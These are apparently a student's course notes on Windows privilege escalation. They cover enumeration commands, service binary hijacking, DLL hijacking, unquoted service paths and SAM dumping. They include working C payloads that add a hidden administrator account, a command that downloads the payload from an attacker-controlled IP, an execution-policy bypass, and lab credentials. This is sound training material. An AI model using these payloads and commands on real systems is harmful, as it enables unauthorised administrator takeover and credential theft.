# Module 16: Windows Privilege Escalation

## Enumerating Windows

### Understanding Windows Privileges and Access Control Mechanisms

Built-in users and groups have a RID under 1000. These RIDs are known as well-known RIDs.

Standard users start at RID 1000.

### Situational Awareness

Information to gather upon gaining access and how:

* Username and hostname
  * `whoami`
* Group memberships of the current user
  * `whoami /groups`
* Existing users and groups
  * Users:
    * CMD: `net user`
    * Powershell: `Get-LocalUser`
  * Groups:
    * CMD: `net localgroup`
    * Powershell: `Get-LocalGroup`
  * Members of groups:
    * CMD: `net localgroup <group_name>`
    * Powershell: `Get-LocalGroupMember <group_name>`
* Operating system, version and architecture
  * `systeminfo`
* Network information
  * Network interfaces: `ipconfig /all`
  * Routing table: `route print`
  * Network connections: `netstat -ano`
* Installed applications
  * 32-bit:
    * CMD: `reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName`
    * Powershell: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName`
  * 64-bit:
    * CMD: `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName`
    * Powershell: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName`
* Running processes
  * CMD: `tasklist`
  * Powershell: `Get-Process`

### Hidden in Plain View

Basically look for .txt, .ini, .csv, etc. files that may have passwords stored...\
`Get-ChildItem -Path C:\Users\ -File -Recurse -Include *.txt,*.ini,*.pdf,*.csv -ErrorAction SilentlyContinue`

### Information Goldmine PowerShell

Checking the History:\
`Get-History`

Finding the **HistorySavePath**:\
`(Get-PSReadlineOption).HistorySavePath`

**Creating a PowerShell remoting sessions via WinRM in a bind shell can cause unexpected behavior.**\
Due to this, use _evil-winrm._\
`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

### Automated Enumeration

Using winPEAS (variations) found at:\
`/usr/share/peass/winpeas/`

Using Ghostpack's seatbelt:

{% embed url="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" %}

## Leveraging Windows Services

### Service Binary Hijacking

Querying services' **Name, State,** and **PathName**. Filter out services not **Running**:

{% code overflow="wrap" lineNumbers="true" %}
```powershell
Get-CimInstance -ClassName win32_service | select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
{% endcode %}

Permissions in the CLI:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

Determining privileges on binaries associated with the services:

```batch
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Assuming we found a binary with weak permissions. Let's replace it with a very basic executable. Starting with creating the .c file on Kali:

```c
#include <stdlib.h>

int main()
{
    int i;
    
    i = system ("net user dave2 password123! /add");
    i = system ("net localgroup administrators dave2 /add");
    
    return 0;
}
```

Next, we'll cross-compile the code with _mingw-64_ since we know the target is 64-bit.

```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Now we'll transfer the **adduser.exe** to the target and replace the original **mysqld.exe** with ours.

```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Now that the binary is replaced, we need to have the service execute it.

```powershell
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

Checking startmode of the server:

{% code overflow="wrap" lineNumbers="true" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```
{% endcode %}

Do we have privileges required to reboot?

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Our user has permission. Disabled vs. Enabled is only in the context of the running process. In this case, it means **whoami** has not requested/is not currently using the SeShutdownPrivilege privilege. Thus the privileges listed are what our user does have access to.

An automated tool like **PowerUp.ps1** would have found the mysql service as well, though it would have run into issues if we tried using **Install-ServiceBinary** due to the code of PowerUp.ps1 having issues with a path included in the way our sql example was. **Thus, don't always trust automated tools to cover every exploit.**

Script execution _may_ be blocked, bypass it:

`powershell -ep bypass`

**PowerUp.ps1** can be found here:\
`/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`

Using PowerUp.ps1:

```
PS C:\Users\steve> . .\PowerUp.ps1
PS C:\Users\steve> Get-ModifiableServiceFile
PS C:\Users\steve> Install-ServiceBinary -<options>

PS C:\Users\steve> Get-UnquotedService
PS C:\Users\steve> Write-ServiceBinary -Path <unquoted, vulnerable path> -<options>
```

### DLL Hijacking

DLLs are searched in this order on current Windows versions due to _safe DLL search mode_:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

DLLs can have an optional _entry point function_ named _DllMain_, which is executed when processes or threads attach the DLL.

We'll re-use the previous C code in our malicious DLL.

<pre class="language-c"><code class="lang-c"><strong>#include &#x3C;stdlib.h>
</strong>#include &#x3C;windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
</code></pre>

Cross-compile this code:

```bash
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

### Unquoted Service Paths

Enumerate running/stopped services:\
`Get-CimInstance -ClassName win32_service | Select Name,State,PathName`

Finding services with unquoted PathNames that are potentially vulnerable:

<pre class="language-batch" data-overflow="wrap"><code class="lang-batch"><strong>wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
</strong></code></pre>

## Abusing Other Windows Components

### Scheduled Tasks

Querying scheduled tasks:

`schtasks /query /fo LIST /v`

Check for the Run as User and the PathTask.

### Using Exploits

Checking for security updates that may have patched vulnerabilities in the OS version found via `systeminfo`:

{% code overflow="wrap" lineNumbers="true" %}
```powershell
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
{% endcode %}

The _SeImpersonatePrivilege_ can potentially be abused to perform privilege escalation. This is commonly found as a privilege for users running an _Internet Information Service (IIS)_ web server.



_Capstone Lab notes:_\
_SeBackupPrivilege_ allows us to dump the reg\sam and reg\system for cracking via `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
